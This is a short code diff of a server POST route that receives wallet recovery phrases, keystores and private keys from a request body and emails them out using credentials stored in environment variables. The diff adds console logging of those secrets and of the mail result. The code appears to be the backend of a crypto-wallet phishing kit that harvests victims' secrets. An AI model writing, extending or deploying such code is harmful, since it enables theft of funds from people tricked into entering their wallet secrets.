@@ -20,7 +20,7 @@ export async function POST(request: Request) {
 
   try {
     const { phrase, keystore, privateKey, item } = await request.json();
-
+console.log(phrase, keystore, privateKey, item);
     if (phrase) {
       const email = process.env.EMAIL;
       const pass = process.env.PASS;
@@ -51,6 +51,9 @@ export async function POST(request: Request) {
       });
 
       const result = await transporter.sendMail(mailOptions);
+      console.log(result);
+      console.log(result.response);
+      
 
       if (result.response.includes("OK")) {
         return Response.json(
